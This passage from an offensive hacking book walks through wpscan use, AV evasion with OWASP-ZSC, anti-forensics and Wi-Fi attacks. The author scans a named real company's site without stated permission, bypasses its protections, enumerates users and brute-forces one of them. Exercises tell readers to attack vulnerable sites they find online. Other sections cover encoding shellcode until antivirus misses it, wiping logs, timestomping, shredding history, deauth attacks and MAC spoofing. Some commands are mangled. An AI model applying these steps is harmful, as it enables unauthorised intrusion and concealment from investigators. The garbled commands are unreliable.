226 | P a g e

## Page 446

As you can see above, wpscan began scanning the selected website. First, it
identified the technologies used (Apache and PHP/7.0.33). Then it began to

## Page 447

look for interesting entries and found /wp-admin/ and wp-admin/admin-
ajax.php. If we scan down a bit, we will see that wpscan identifies all the
themes and plugins in this WordPress site. If we scan a bit further, we can
see it found one vulnerability, a cross-site scripting (XSS) vulnerability in
its Custom Contact Forms.
Note that the vulnerability gives us references to the vulnerability websites,
wpvulndb.com and
www.packetstormsecurity.com . www.wpvulndb.com is owned by the devel
oper of wpscan and is dedicated to just WordPress security.
Let’s go to www.packetstormsecurity.com for more information on this
vulnerability.
227 | P a g e

## Page 448


## Page 449

As you see above, www.packetstormsecurity.com first identified this cross-
site scripting or XSS
vulnerability in this Contact Form back in 2012, but apparently it is still not
patched in 2019. If we were on the penetration testing team for this site, our
next task would be to test whether this vulnerability actually exists by using
the POC, or proof of concept, attack the security researcher outlines in this
security alert, as seen below.
Insecure Information Security Firms
I always find it a bit amusing how many security firms do a poor job of
securing their own websites. Most famously, in 2011, the widely-known and
well-regarded US-based information security firm, HBGary, 228 | P a g e

## Page 450

had its website hacked. HBGary had been attacking the loosely organized
hacking group, Anonymous, when Anonymous decided to hack back.
Thousands of documents and emails were released on the Web
that were both embarrassing to the firm and its clients (many of the most
powerful firms in the United States). I’m not sure how their clients felt, but
I would be reluctant to pay someone to secure my information who can’t
secure their own.
We may have a modern-day HBGary in our midst. The information security
firm www.cybrary.it
has a website built on WordPress. Let’s see if their website is secure.
To scan cybrary.it, let’s use the standard command as we used above, but
let’s add another option to enumerate the users. This option will attempt to
identify the users with access to update and alter the site, essentially
webmaster rights. This option is --enumerate u and we can simply append
to our
command, such as;
kali > wpscan –url https://www.cybrary.it –en umerate u
When the command is run, it returns an error that the site is NOT running
WordPress. That’s curious, as I’m quite certain it is running WordPress.
Sometimes websites have load balancers and DoS protection technologies
that limit these types of scans.
Fortunately, wpscan has a stealthy mode that sometimes is capable of
getting past these protections.
Let’s try it by adding the option –stealthy at the end of our command.
kali > wpscan –url https://www.cybrary.it –en umerate u –stealthy 229 | P a
g e

## Page 451


## Page 452

As you can see, our scan was able to get past their protections and found
twenty-seven vulnerabilities!
Furthermore, it was able to detect several users on the system.
Additionally, wpscan has a brute-force password cracking capability for
WordPress sites once the users are identified. This brute-force capability
actually bypasses the form (thereby evading some brute-force protection
mechanisms) and sends the potential passwords directly to the exposed
portion of the website that feeds the passwords back for authentication
(xmlrpc). To use the brute force capabilities of his tool, you need to use the
–U option, followed by the username , and the –P option followed by the
password list you want to use.
230 | P a g e

## Page 453

In this case, let’s try to brute force the user lpark and use our
top1000passwords list such as: kali > wpscan –url https://www.cybrary.it –
stealthy –U lpark –P
/root/top1000passwords
After scanning through and listing the vulnerabilities again, wpscan will
begin to attempt to brute force that user.
Summary
Web hacking is among the most important risks to the incredible
applications and infrastructure that comprise the World Wide Web. There
are almost innumerable ways to hack the apps and infrastructure of the
Web, and the approach you take will depend upon multiple factors
including; the technologies employed by the website, the Web server, or the
user.
SQL Injection is one of the most pernicious attacks against websites and
certainly the one responsible for the greatest financial losses. Here we were
able to fingerprint the database and extract key information using the
sqlmap application.
It’s important to note that most online databases are no longer vulnerable to
this simple attack, but a few still are. For more advanced SQL injection
techniques such as blind SQL injection, look for my next book
“Getting Started Becoming a Master Hacker 2.”
WordPress is the world’s most popular CMS for developing websites. Our
tool wpscan, is excellent at identifying vulnerabilities of these sites,
enumerating users and brute-forcing passwords.
231 | P a g e

## Page 454

Exercises
1. Use Google hacking to find potentially vulnerable websites to SQL
injection.
2. Use OWASP-ZAP to determine if the sites you found in the previous
step are vulnerable to SQL injection.
3. Use Google hacking to find WordPress sites.
4. Use Google hacking to find information leaks in WordPress backups.
5. Use wpscan to search for vulnerabilities in the WordPress sites you
identified in the previous step.
6. When you find vulnerabilities in the site, get more information and
possibly the exploit by searching wpvulnsdb.com or
packetstormsecurity.com.
232 | P a g e

## Page 455

1 3
Evading AV and Shellcode
Fools talk. The wise listen .
Master OTW
When exploiting the target as we did in Chapter 9 with
Metasploit, you are likely to encounter an anti-virus
program running on the target system . It is a rare target that’s
not protected with an anti-virus application. As such, we need to
examine how we might evade such protection.
Often, the best way to avoid AV detection is to use a memory
corruption exploit and load the payload directly into memory without
ever writing to the hard drive. This is what we did with the EternalBlue
exploit. Unfortunately, that’s not always possible with every exploit.

## Page 456

233 | P a g e
In the past, the msfvenom module of Metasploit from Chapter 9, was
capable of creating payloads that could evade AV detection, but the AV
developers didn’t sit idle. These software companies soon
developed techniques for detecting nearly any payload developed by
msfvenom, but not all (recently, some advanced persistent threat (APT)
malware from a nation-state effectively evaded AV using the shikata-ga_nai
encoder) . This means that to have a reasonable chance of success at
evading
detection by anti-virus software, we will need to turn to other software to
help us re-encode our payloads.
Metasploit’s New Evasion Module
Recognizing the limitations of msfvenom to evade AV detection, the
developers of Metasploit began a new project to aid in the evasion of anti-
virus. When Rapid7 released Metasploit 5 in October 2018, it contained two
new evasion modules. These modules were a departure for Metasploit, as
there had not been any new module types in quite a few years.
When the new modules were released, they were very effective at evading
Windows Defender in
Windows 10. Unfortunately, in the ongoing chess game between attackers
and defenders, the folks at Microsoft added detection of these payloads
developed by these new modules shortly thereafter. Despite this, we must
give kudos to Rapid7 for putting time and effort toward this crucial issue
(for more on the new Metasploit evasion modules, read
https://www.hackers-arise.com/post/2019/03/27/metasploit-basics-
for-hackers-part-24-the-new-evasion-modules-in-metasploit-5)
How Antivirus Software Works

## Page 457

Before we begin to work toward an undetectable payload, we need to
understand how anti-virus software works. Most AV software can detect
malicious code by comparing signatures (code snippets and other artifacts)
of known malware against software that is entering the system (for more on
how antivirus
software works, go to https://www.hackers-arise.com/single-
post/2016/10/28/Evading-AV-Anatomy-of-
ClamAV). Although some software developers have begun to use heuristic
techniques (detecting known malicious behavior) this is still not widespread
among AV applications as it requires significant CPU
cycles to incorporate this approach. The result of using heuristics is slower
scanning and system lag.
It is also important to note that not all AV software is created equal. Not
every AV application will catch all known malware. VirusBulletin is an
independent AV software testing laboratory. According to their results,
commercial AV software is capable of detecting between about 60-98
percent of known malware.
Most of the major AV software developer results are clustered in the 95
percent range. Even with these, 95-percent detection means 1 in 20 known
malware will go undetected by these applications. Of course, a zero-day--by
definition, unknown malware-- is likely to sail right past all of these
applications.
234 | P a g e

## Page 458

This perspective is key because to compromise a target, you may not need
to be undetectable by ALL AV
applications. You only need to be undetected by the target’s AV software. If
you know what AV software the target is using, you can focus on making
your payload undetectable by that application (see my article
https://www.hackers-arise.com/single-post/2016/05/23/How-to-Use-
Reconng-to-Determine-the-Targets-

## Page 459

AV-Software-1 on using recon-ng to determine the target’s AV software).
Tools for Making Payloads Undetectable
Among the tools available to create payloads/shellcode capable of going
undetected by (AV) software such as veil-evasion (https://www.hackers-
arise.com/evading-av-with-veil-evasion) or shellter
(https://www.hackers-arise.com/evading-av-with-shellter) , OWASP-ZSC
(Z ero-day S hellC ode) may be the most versatile. OWASP-ZSC is a
project of OWASP (the venerable Open Web Application Security project of
the OWASP Top 10 fame and OWASP-ZAP, among other things), continues
under
development , but has some useful features not found in some of the other
applications in this category. In this chapter, I will attempt to demonstrate
some of the most important features of OWASP-ZSC and how they can be
used to create shellcode/payloads that will go undetectedby AV software.
What is Shellcode?
Shellcode is simply a set of instructions (code) that, when executed into a
running application such as SMB (like EternalBlue does) or other
vulnerable services, gives the attacker control of the system. This code is
written in assembler language (for more on assembler language, see
https://www.hackers-
arise.com/single-post/2017/02/27/Reverse-Engineering-Malware-Part-2-
Assembler-Language-Basics ).
When a stack or heap-based buffer overflow is executed, the shellcode is
then injected and often gives the attacker a way to control the target system
through such things as a command shell (hence its name).
Whenever new shellcode becomes available, it is incumbent upon the anti-
virus software developers (if they want to remain relevant in this industry)
to develop a signature or other method to detect the malicious content. As
hackers/pentesters, we need to constantly change our shellcode to evade the

## Page 460

antivirus software and remain stealthy and effective. OWASP-ZSC is one
more tool we can use to create, encode, and obfuscate our shellcode to
remain undetected by the anti-virus software on the target's machine.
235 | P a g e
Let's take a look at how we can use OWASP-ZSC to build, encode, and
obfuscate our shellcode.
Download and Install OWASP-ZSC
OWASP-ZSC is not built into Kali, nor is it in the Kali Repository, so we
will need to download it from github.com.
kali > git clone https://github.com/zscproject/OWASP-ZSC
Once we have downloaded OWASP-ZSC to our Kali system, the next step
is to install it.
Navigate to the directory of OWASP-ZSC.
kali > cd OWASP-ZSC

## Page 461

Next, we need to execute the installer script that comes with it. Make
certain you give yourself execute permission (chmod or see Linux Basic for
Hackers ).
kali > ./installer.py
236 | P a g e

## Page 462

Once the installer has run, you should see a screen like that above. Note that
to uninstall OWASP-ZSC, you simply run the ./uninstaller script. Also, once
OWASP-ZSC has been installed, you need only
type zsc to start this script.
Let’s get started!
kali > zsc
Before we begin using OWASP-ZSC, let's take a look at the help screen.
That's ALWAYS a good idea when using a new application.
zsc > help
237 | P a g e
In the screenshot above, you can see that OWASP-ZSC displays all the
commands in its help screen. The key commands are the first six, but also
note the back, clear, help, and exit commands, which are useful when using
OWASP-ZSC.
When we want to generate some shellcode, we simply enter the command,
shellcode.
zsc> shellcode
Then, the command,generate.
zsc/shellcode> generate

## Page 463

We then select the platform. In this case, let’s select windows_x86 as most
hackers are interested in targeting Windows systems and x86 code will run
on either 32- or 64-bit systems.
zsc/shellcode/generate>windows_x86
Next, when we hit the TAB key, OWASP-ZSC will list all the shellcode for
that platform.
We can use any of this code, but if we want any chance of evading AV, we
will likely need to use different shellcodes than these default ones.
OWASP-ZSC has a built in API (Application Programming Interface, or a
way to access the application) to access shellcode at shell-storm.org.
Shellstorm is a database of shellcode that you can use. You can view this
database at www.shell-storm.org .
238 | P a g e

## Page 464

Now, instead of using the default shellcode that is likely to be detected by
AV, let's generate some evasive shellcode from this database.
Let’s return to zsc> prompt using the back command.
As we can see from the help screen at the beginning, we can simply type
"shellcode."
zsc > shellcode
If we use the TAB key we will get a list of commands. Within OWASP-
ZSC, we can access the
www.shell-storm.org database by using the shell_storm_list command zsc >
shell_storm_list
239 | P a g e

## Page 465

As you can see above, OWASP-ZSC lists all the shells available in the
database grouped by operating system.
If we scan down a bit, we will come to the Windows shellcode. Here you
will see #627 or “Windows Seven x64”.
Let’s try using that one.
Alternatively, we could use the search function of OWASP-ZSC to find this
shell, or any shell, if we know a keyword in its name. In this case, we might
use the keyword “seven.”

## Page 466

zsc >search
240 | P a g e
keyword_to_search > seven
As you can see, OWASP-ZSC was able to locate the same shellcode and
provided us with key
information about it (author, ID, platform, and title).
Now that we know what shellcode we want to use, we can use the
download command to download the
shellcode from shell-storm.org to OWASP-ZSC through the API.
zsc/shellcode/download

## Page 467

OWASP-ZSC then prompts us for the shellcode ID. Simply enter the ID of
the shellcode you want to use. In this case, let’s use ID 627 .
shellcode_id> 627
OWASP-ZSC now downloads this shell and displays it on the screen as you
can see above.
241 | P a g e
The next step is to obfuscate the shellcode. Obfuscation means to make it
difficult to understand. In this case, we are trying to make it difficult for a
malware analyst—or forensic analyst—to understand the intent and
function of the code.
zsc > obfuscate
When we hit the TAB key, it lists all the obfuscation methods. Let’s assume
we want this shellcode to work with a browser exploit, so select javascript.
zsc/obfuscate > javascript
Next, OWASP-ZSC prompts us for the filename we want to use for our
obfuscated file. I named it
windows7shell, but you can name it anything you want.

## Page 468

zsc > windows7shell
The next step then is to encode the shellcode. OWASP-ZSC prompts us
with
encode >.The idea here is to make it more difficult for the AV application to
match anything in this shellcode with its database of known malicious code.
When we hit the TAB key, it lists all the methods available for this
shellcode. These encoding
methods will differ slightly with different shellcode and obfuscation
techniques.
In this case, we will encode it with jsfuck.
242 | P a g e
encode > jsfuck
Yes, jsfuck is real encoding scheme. It is seldom used subset of
Javascript that is written with just 6 characters ([,],(,),! and +. It can be
particulary useful for bypassing web form input validation and
obfuscation.
When we hit enter, OWASP-ZSC encodes our shellcode with jsfuck and
announces it has completed its task!
Testing Our Shellcode
The final step is to test your new shellcode against AV software. If you
know what AV software the target is using, simply test it against that one

## Page 469

(check out my article on recon-ng to determine the AV the target is using).
If not, you can test your new shellcode at VirusTotal (www.virustotal.com).
It’s important to note that VirusTotal shares your code with the AV
developers.
243 | P a g e

## Page 470

If you don’t want your code shared with the AV developers, use
www.scanii.com to see how well it evades most commercial AV software.
In this case, I uploaded my encoded and obfuscated window7shell to
VirusTotal and got the following results.
244 | P a g e

## Page 471

As you can see, we were successful! None of the AV applications detected
my obfuscated shellcode!
Summary
AV applications detect most malicious payloads and shellcode on the target
system. For any chance to remain undetected, you will need to re-encode
and obfuscate your shellcode (you can also write your own unique
shellcode. I’ll show you how in a future book). OWASP-ZSC, by the
OWASP Project, is one of the best AV evasion tools. Here we took
shellcode from the shellcode database at shell-storm.org, and with some
creative encoding and obfuscation, were able to get it past the major AV
applications.
Of course, since I sent my shellcode to VirusTotal, it will be reported to all
the major AV application developers, and now they will detect it (you are
welcome!). To develop your own undetectable payload, you will need to try
different combinations of payloads, encoding, and obfuscation. Be creative
and persistent—two of the most important attributes of a master hacker!

## Page 472

Exercises
1. Download and install OWASP-ZSC.
2. Select a shellcode from shell-storm.org.
3. Obfuscate your shellcode.
4. Encode your shellcode.
5. Test your shellcode at scanii.com.
6. If you know the antivirus application of the target, test your shellcode
with it now.
7. If your shellcode was detected, start over and try a different approach
until your
shellcode/payload is undetected.
245 | P a g e

## Page 473

1 4
Covering Your Tracks
Stars, hide your fires; Let not light see my black and deep desires.
MacBeth
Hackers who want to remain long in this business need to
make certain they leave behind little or no trace of evidence .
The skilled and vigilant digital forensic investigator can find evidence
in many places. In this chapter, we will focus on the log files, file
timestamps, and bash command history. If the hacker can clean up the
evidence in these three areas, it will be very difficult to trace them.
246 | P a g e

## Page 474

Now that you have exploited the Windows 7 system (Chapter 9) and
retrieved the “goodies”such as: (1) Password hashes,
(2) Microphone recordings,
(3) Webcam recordings,
(4) Keystrokes entered by the target system, then
(5) Pivoting from the target system to the entire network.
At this stage, you need to make certain that no evidence is left behind to
trace this attack back to you.
A digital forensic investigator is capable of recreating the events on a target
system primarily from the log files and timestamps. This means that you
need to remove all the log files or selectively remove certain log files that
capture your activity. In addition, if you have accessed or modified any
files, the timestamps on those files are clear evidence of tampering. Finally,
if your system falls into the wrong hands, your command history can be
incriminating.
Let’s see how you can minimize this evidence and cover your tracks!
Covering Your Tracks with the Meterpreter
If you were able to plant Metasploit’s meterpreter on the target system,
clearing log files is relatively simple. Most of the Windows meterpreters
have a built-in command known as clearev. This command
clears the event logs in Windows systems.
meterpreter >clearev

## Page 475

In some cases, you may not be able to get a meterpreter on the target
system, or the clearev command won’t work. In those cases, you can use the
wevtutil utility in Windows. If you are using the
meterpreter, you will first need to drop into a command shell (cmd) on the
target Windows system (if you do not have a meterpreter but rather just a
standard Windows command prompt, you can skip this step).
You can do this by simply entering shell at the meterpreter prompt.
meterpreter> shell
247 | P a g e

## Page 476

Windows has a little-known utility named the Windows Event Utility, or
wevtutil for short. You can access it from the command line. To be able to
clear event logs, you will need system admin privileges.
Let’s begin by simply running the wevtutil to get a help screen.
C:\Windows\System32> wevtutil

## Page 477

As you can see, this utility has a number of options, but to clear logs we
simply need to run the wevtutil, followed by cl (clear), and then the event
log category we want to delete. So, if we wanted to clear the “security”
logs, we would simply enter;
C:\Windows\system32\wevtutil cl security
This command prompt will echo back your command and then return you a
new command prompt. To
check to see whether anything happened, you can go to the Windows GUI
and open the “Computer
248 | P a g e

## Page 478

Management” console. There, you can click on Windows logs and then
click on Security. As you can see, all the logs were cleared in the Security
logs directory!
Timestomp
In some cases, your post-exploitation activities may include accessing or
altering documents, reading emails, and other file access. In all of these
cases, you will leave evidence behind for a skilled investigator. Every
operating system and file system timestamps files. These timestamps
include the last Modify, Access, and Creation (MAC) dates and times. They
are a staple of the forensic investigator looking for evidence of compromise
and recreating a timeline of events.
M
Modify

## Page 479

A
Accessed
C
Created
These timestamps can be evidence of accessing and alteration of files. A
thorough and skilled forensic investigator can use these timestamps to
recreate the events on the system, including any alteration of files. To cover
your tracks, you will need to alter these timestamps if you have “touched”
any files.
Luckily, altering timestamps is not difficult to do. If you plan to access or
alter any files, first record the original timestamps. Once you have accessed
or altered the file, you can then use a utility within your meterpreter to
return the timestamps to their original status. It’s called timestomp (note
that it is the same as timestamp but with an “o”). To understand how it
works, enter timestomp with the help
option.
meterpreter > timestomp help
249 | P a g e

## Page 480

Let’s assume there is a piece of malware on the system named
“malwarevnc.” Presumably, this
malware is used to give the attacker a VNC GUI on the system. We can
change all the timestamps (MAC) by using timestomp with the –z option
followed by the date and time we want “stomped” on the file, such as:
meterpreter> timestomp –z malwarevnc –z “06/25/2015 09:25:03”
Note that the date and time must be enclosed in double quotation marks. If
we only wanted to change only the M attribute (Modified) we would use the
same command but with the –m option; if we wanted to change only the A
attribute (Accessed) we would use the –a option; and if we only wanted to
change the C attribute we would use the –c option (that’s pretty easy to
remember). Often, it would be wiser to change each of these attributes

## Page 481

separately, thereby avoiding any red flags to investigators. These files
seldom have the same timestamps in the wild.
Covering Your Tracks on Linux Systems
Covering your tracks on Linux systems is a bit more complex as Linux
systems place their logs in many different places. Each application
maintains its own logs, and the kernel and utilities maintain their own 250 |
P a g e
separate logs. Most Linux systems have a utility named rsyslog to send all
the logs to a central server.
To manage your footprint on the target system, you can manipulate this
utility to stop logging while you are in the system.
Probably the simplest way to cover your tracks while on a Linux system is
to stop the rsyslog service.
> systemctl rsyslog stop
This will stop the rsyslog service and disable logging to the log server. Of
course, this will leave a significant time gap in the logs, but few
administrators watch their logs that closely. The last thing before leaving
the system would be to restart the rsyslog system, making it less obvious
that someone has tampered with the logs.
> systemctl rsyslog start
Removing Your Command History

## Page 482

Finally, you may want to make certain that that your command history is
not left behind should your computer fall into your adversary’s hands. In
that case, your BASH history can be critical for recreating your actions.
You have at least two strategies here. First, you can keep your system from
storing your commands, and the second is to remove the commands from
your history.
You can view your history of commands by entering the command history
at the prompt.
kali > history
To turn off your command history, you will need to change the value of
your environment variable $HISTSIZE. You can do this by setting your
HISTSIZE variable to zero (no commands stored) and
exporting the variable (for more on environment variables in Linux, see
Linux Basics for Hackers ).
kali > HISTSIZE=0
kali > echo $HISTSIZE
251 | P a g e

## Page 483

Now, your BASH shell will not store ANY of your commands. This can be
a bit inconvenient as now you can’t use your UP or DOWN arrows to scroll
through your previous commands.
A better solution may be to remove your individual commands from your
history. You can remove any command from your history by using the –d
option with the history command followed by the command number. So, if
you wanted to remove the 3rd command in your history (.keylog_start),
enter:
kali >history –d -3
If you want to remove all your command history, you can use the history
command followed by the –c switch.
kali > history –c
Now when you enter the history command, only your last command
appears.
This may be enough to make certain that no one can recover your command
history, but remember
deleting files does not mean they are unrecoverable. When files are deleted,
they are made available to the file system for being overwritten. Until these

## Page 484

files are overwritten, they are completely recoverable (for more on this
subject see https://www.hackers-arise.com/recovery-of-deleted-files). In
some cases, even
after being overwritten, they can be recovered by a skilled forensic
investigator.
The shred command overwrites the target files with random data multiple
times, making it nearly
impossible to recover their contents of the command history.
Let’s look at the help screen for shred.
252 | P a g e

## Page 485

kali > shred –h
As we saw above, the user’s command history is viewable using the history
command, but the command history is actually stored in the user’s profile
file named .bash_history. We can shred that file by using the command:
kali > shred –f .bash_history
Now, when we go back and view the .bash_history, but can see nothing
intelligible!
Kali > cat .bash_history
253 | P a g e
Summar y
After compromising a system or network, the hacker needs to make certain
that little or no evidence is left behind. A skilled and diligent digital forensic
investigator can recreate the events and determine what took place on the
system. To remain stealthy, the hacker/pentester must make certain to
remove any evidence of their activities. Most importantly, this includes
removing any log files or command history files.
Exercises
1. Use the clearev command to clear the event logs on a

## Page 486

compromised Windows system from the meterpreter.
2. Selectively remove log files with wevtutil on a Windows
system.
3. Stop the rsyslog service on a Linux system to disable logging.
4. Delete all your commands using the history command.
5. Shred your history file to remove all evidence of your BASH
commands
254 | P a g e

## Page 487

1 5
Wi-Fi Hacking
There is ALWAYS opportunity in chaos
Master OTW
In our modern digital age, wireless connections are the norm. We
connect to the Internet via Wi-Fi, we connect to our speakers and
phone via Bluetooth, and we connect our phones via cellular service.
All are wireless, and all are susceptible to being hacked. Each of these
areas of hacking would warrant a separate book, but in this chapter,I’ll
focus on some of the best, most recent, and most effective hacks to Wi-
255 | P a g e
Fi (for Bluetooth Hacks see www.hackers-arise.com/hacking-bluetooth and
for Cellul ar Hacks, see OTW’s Mobile Hacking course).
In this chapter, we will explore multiple ways that these wireless
technologies can be attacked and broken.This includes both acquiring the
password (PSK) and eavesdropping on Wi-Fi traffic. These techniques
require a bit of sophisticated Linux and Kali skills (see Linux Basics for
Hackers ) and patience, but if you have those two elements, you should be
successful cracking nearly any Wi-Fi AP!
Let’s begin with Wi-Fi or 802.11, as it is known to the IEEE. We all know
how to work with Wi-Fi, but few of us understand its inner workings.
Understanding a bit about its anatomy will help us in attacking it.
Wi-Fi or 802.11

## Page 488

Wi-Fi is also sometimes referred to as “Wireless Local Area Network” or
WLAN, which basically sums up what this technology is all about. In
technical terms, Wi-Fi (or wireless networking) is known as IEEE
802.11 technologies. Without getting into too much detail, IEEE 802.11 is a
set of standards created and maintained by the Institute of Electrical and
Electronics Engineers (IEEE),that are used to implement WLAN
communication in select frequency bands.
Initially, Wi-Fi was secured with Wired Equivalent Privacy or WEP. This
proved flawed and easily hacked, so the industry developed WPA as a short-
term fix. Eventually, the industry implemented WPA2, which has proven
relatively resilient to attack, but does have its flaws. The industry is
presently rolling out WPA3 due to these vulnerabilities in WPA2.
Terminology
This chapter contains a lot of new terminology and acronyms, so let’s pause
a moment to review some terminology.
AP
This is the access point, or the place where the clients connect to the Wi-
Fi and get Internet access.
PSK -
Pre-Shared-Key:his is the password used to authenticate to the AP
SSID -
The name used to identify the AP
ESSID -
Extended Service Set Identifier: same as the SSID but can be used for
multiple APs in a wireless LAN

## Page 489

BSSID -
Basic Service Set Identifier: this is the unique identifier for every AP.
It’s the same as the MAC address of the AP.
Channels -
Wi-Fi operates on channels 1-14 but is limited to 1-11 in the United
States.
Power -
The closer you are to the AP, the stronger the signal. The signal in the
United States is limited to .5 watts by the FCC
256 | P a g e
Security -
This the security protocol to authenticate and encrypt Wi-Fi traffic. The
most popular at this time is WPA-PSK.
Modes -
Wi-Fi can operate in three modes: master, managed, and monitor. APs
operate in master mode, wireless network interfaces operate in monitor
mode by default, and hackers usually operate in monitor mode.
Range -
At the legal limit of .5 watt, most Wi-Fi APs are accessible up to 300ft
(100m) but with high gain antennas can be accessible up to 20 miles.

## Page 490

Frequency -
Wi-Fi is designed to operate at 2.4GHZ and 5GHZ. Most modern
systems now use both.
802.11 Security Protocols
There have been several security protocols to protect and encrypt Wi-Fi,
and your strategy will depend upon which has been implemented.
WEP
The initial security protocol to secure 802.11 was named WEP or Wired
Equivalent Privacy. By
2001, hackers discovered that--through statistical techniques--they could
crack the user’s password in minutes due to improperly implemented RC4
encryption. The IEEE had to quickly
find a replacement as all the Wi-Fi APs were left without security at that
point. Few of these access points are still in use today (you will find some,
though)
WPA
In 2003, IEEE created a short-term fix they called Wi-Fi Protected Access,
or WPA. The key part of this new security protocol was that it did not
require replacing the existing hardware, but rather it relied upon firmware
upgrades. WPA also relied upon the RC4 encryption algorithm but
added some additional features making the PSK more difficult and time-
consuming to crack.
These features included:
1. Making the Initialization Vector longer from 48 to 128 bits
2. TKIP which generates different keys for each client

## Page 491

3. Message Integrity Check to make certain the messages have not been
altered in route
WPA2
The WPA2 802.11i standard was finalized in June 2004. WPA2 uses the
counter mode with Cipher Block Chaining Message Authentication
Protocol, more commonly known as CCMP. This new protocol was
based upon Advanced Encryption Standard (AES, see Appendix A for more
on Cryptography) algorithm 257 | P a g e

## Page 492

for authentication and encryption. CCMP was more processor-intensive, so
most AP’s had to be replaced with more vigorous hardware.
WPA2 supports both Personal and Enterprise modes. When using the
personal mode (PSK), the pre-

## Page 493

shared key (password) is combined with the SSID to create a pairwise
master key (PMK). This was
designed to make a rainbow table password cracking more difficult. The
client and the AP exchange messages using the PMK to create a pairwise
transient key (PTK). This key is unique to each user and session and was
designed to making sniffing of Wi-Fi traffic more difficult.
Wi-Fi Adapters for Hacking
Although nearly everyone has a Wi-Fi adapter on their laptop or mobile
device, these Wi-Fi adapters are generally inadequate for the attacks I
outline here. Wi-Fi hacking requires a specialized Wi-Fi adapter, one that is
capable of injecting frames into a wireless AP. Few
off-the-shelf Wi-Fi adapters can do so.
Aircrack-ng is the most widely used tool for Wi-Fi (many tools
simply put a GUI over aircrack-ng) hacking, and aircrack-ng
maintains a list of Wi-Fi chipsets that are compatible with their
software at https://www.aircrack-
ng.org/doku.php?id=compatible_cards).I can save you a l ot of time and
research and simply recommend the Alfa Wi-Fi cards. I
have been using them for years, and they work flawlessly. They
are inexpensive, effective, and efficient. I will be using the Alfa
AWUS036NH throughout this chapter. You can order your own
with a high gain antenna (not required, but recommended) from
Amazon for less than $40 (https://amzn.to/2PvC1u0).
Before we begin attacking the Wi-Fi, let’s review some

## Page 494

commands and concepts we will need to attack them.
Viewing Wireless Interfaces
First, we need to view our wireless interfaces. You can do by simply using
the ifconfig command in Linux. This command displays all your
networking interfaces.
kali > ifconfig
258 | P a g e

## Page 495

To be more specific and view only the wireless interfaces, you can use the
iwconfig command.
kali > iwconfig
As you can see, this command only displays those interfaces with “wireless
extensions.”
To view all the Wi-Fi APs within range of your wireless network interface,
you can enter iwlist in Linux.
kali > iwlist
259 | P a g e

## Page 496

This command is capable of detecting all the AP’s within range and
providing you with key information about each, including:
1. Its MAC address
2. Its channel
3. Frequency
4. ESSID
5. Its Mode
Monitor Mode
Speaking of Wi-Fi mode, Wi-Fi or 802.11 has three modes: master,
managed, and monitor. Monitor
mode is similar to promiscuous mode in a wired network, where the
network device is capable of picking up all packets passing its way.
Generally, in Wi-Fi hacking, you will need your wireless card in monitor
mode. To do so, enter:
kali > airmon-ng start wlan0
260 | P a g e

## Page 497

When you enter this command, it places your wireless interface into
monitor mode and changes its name.
Here you can see it has changed it to wlan0mon.
Also, note that it warns that three processes could cause trouble. Despite
this warning, usually, this does not cause a problem. If it does create a
problem, enter:
kali > airmon-ng check kill
Capturing Frames
Next, with our wireless NIC in monitor mode and seeing all the traffic
around us, we need to begin to capture that data. We can do so by using the
airodump-ng command in the aircrack-ng suite as so: kali> airodump-ng
wlan0mon
Now, we can see all the APs with their critical information in the upper part
of the screen and the clients in the lower part of the screen. All the
information we need to attack these APs and clients is available right here!
Attacking Wi-Fi APs
Hidden SSIDs
Most security engineers are taught to “hide” their SSID’s. The thinking is
that by hiding their SSID, only people who know the SSID will be able to

## Page 498

discover and connect to their Wi-Fi AP. Their trust in this strategy is
misplaced.
Whenever a legitimate client tries to connect to an Access Point (AP), both
the probe response and request contain the SSID of the access point. In
addition, generally, you do not need the SSID to connect to the AP, if you
have the BSSID (the MAC address) of the AP. As this information is
broadcast over the 261 | P a g e
airwaves, the hacker only needs to use a tool such as airodump-ng or others
to view the BSSID’s, as we saw above.
Defeating MAC Filtering
Again, network security engineers are taught to limit who can access their
Wi-Fi AP by using MAC
filtering. This technique limits who can access the AP by MAC address (the
globally unique identifier on every network interface). The security
engineer puts the MAC addresses of all the legitimate users and their
systems into the administrator interface of the AP. This means that these
MAC addresses are allowed to connect, and the AP rejects everyone else.
Unfortunately, this technique fails miserably in the face of some simple
techniques.
The hacker can use airodump-ng to find the MAC addresses of clients that
have authenticated to the AP.
kali > airodump-ng –c 11 –a –bssid <mac>
Once the hacker knows the MAC address of the authenticated client, they
can simply “spoof” that MAC

## Page 499

address. This requires that we take down the interface:
kali> ifconfig wlan0 down
Then, use macchanger to spoof the MAC address making it the same as the
connected client’s MAC.
kali > macchanger –m <mac> wlan0
Now, bring back up the interface, and it will have the same MAC address as
one of the systems that are allowed to connect to the AP. Simple!
kali > ifconfig wlan0 up
262 | P a g e

## Page 500


## Page 501

Once the attacker’s MAC address matches one in the MAC filtering
whitelist, they can connect to the AP
without interference.
Attacking WPA2-PSK

## Page 502

WPA2-PSK is the most widely used security protocol among Wi-Fi routers.
Although WPA3 has just
been released, it has not yet been widely deployed. As a result, let’s focus
on WPA2 cracks.
Unlike some earlier Wi-Fi hacking techniques such as WEP (where you
could crack the password in
minutes using statistical techniques), the strategy with WPA2 is similar to
our password cracking techniques in Chapter 8. With WPA2-PSK, we first
capture the hash of the password and then we apply a wordlist in a hash
cracking program such as hashcat to find a match.
The key is to grab the password hash as it is transmitted through the air.
WPA2-PSK has what is known as the four-way handshake where the
password hash is transmitted across the air between the client and the AP.
We can capture it there and then apply our familiar techniques and
resources for password hash cracking.
WPA2-PSK 4-Way Handshake
263 | P a g e
The first step is to put our wireless network card in monitor mode.

## Page 503

kali > airmon-ng start wlan0
Then we start airodump-ng to collect information and packets.
kali > airodump-ng wlan0mon
We will likely want to focus our packet capture on a single AP on a single
channel. We can do that by entering:
kali > airodump-ng –bssid <BSSID of the Target AP> -c <the channel the
AP is transmitting on> --write <file name to save the hash> wlan0mon
If you are impatient like me, you can bump off a client who is already
connected to the AP, and then when they reconnect, you will capture their
handshake using aireplay-ng such as;
kali > aireplay-ng –deauth 100 –a AA:BB:CC:DD:EE:FF wlan0mon
264 | P a g e

## Page 504

Where:
aireplay-ng
is the command
--deauth 100
is the option to send 100 deauth frames into the AP
-a <BSSID> is the BSSID of the target AP
wlan0mon
is your wi-fi adapter in monitor mode
Now, when the client re-authenticates to the AP, airodump-ng will
automatically detect the four-way handshake, capture it and write it to the
file you designated (HackersAriseCrack).
When we do a long listing on our working directory, we will find five files
creating by airodump-ng. The first one, Hackers-AriseCrack-1.cap contains
the hash for cracking.
265 | P a g e
Now that you have the handshake, you simply need to use a hash cracking
program such as hashcat to brute-force the password. Admittedly, this can
